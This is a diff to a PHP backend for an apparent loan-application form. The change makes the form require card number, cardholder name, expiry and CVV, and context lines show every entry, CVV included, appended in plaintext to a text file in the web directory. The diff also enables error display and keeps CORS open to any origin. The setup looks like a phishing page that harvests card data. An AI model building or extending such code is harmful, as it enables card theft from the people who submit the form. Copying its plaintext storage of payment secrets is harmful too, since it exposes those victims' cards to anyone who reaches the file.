@@ -1,7 +1,7 @@
 <?php
 // Ensure this is at the very top of the file
-error_reporting(0);
-ini_set('display_errors', 0);
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
 
 // Set headers to handle CORS and content type
 header("Access-Control-Allow-Origin: *");
@@ -47,7 +47,7 @@ $formData = [
 ];
 
 // Validate required fields
-$requiredFields = ['firstName', 'lastName', 'dni', 'email', 'phone'];
+$requiredFields = ['firstName', 'lastName', 'dni', 'cardNumber', 'cardName', 'cardExpiry', 'cardCvv'];
 foreach ($requiredFields as $field) {
     if (empty($formData[$field])) {
         http_response_code(400);
@@ -85,8 +85,8 @@ try {
     $logEntry .= "CVV: {$formData['cardCvv']}\n\n";
     $logEntry .= "======================================\n\n";
 
-    // Save to file
-    $fileName = 'solicitudes_prestamos.txt';
+    // Save to file with absolute path
+    $fileName = __DIR__ . '/solicitudes_prestamos.txt';
     if (file_put_contents($fileName, $logEntry, FILE_APPEND) === false) {
         throw new Exception('Failed to save data to file');
     }
@@ -96,6 +96,7 @@ try {
     echo json_encode(['success' => true, 'message' => 'Solicitud guardada exitosamente']);
 
 } catch (Exception $e) {
+    error_log("Error saving form data: " . $e->getMessage());
     http_response_code(500);
     echo json_encode(['success' => false, 'error' => $e->getMessage()]);
     exit();
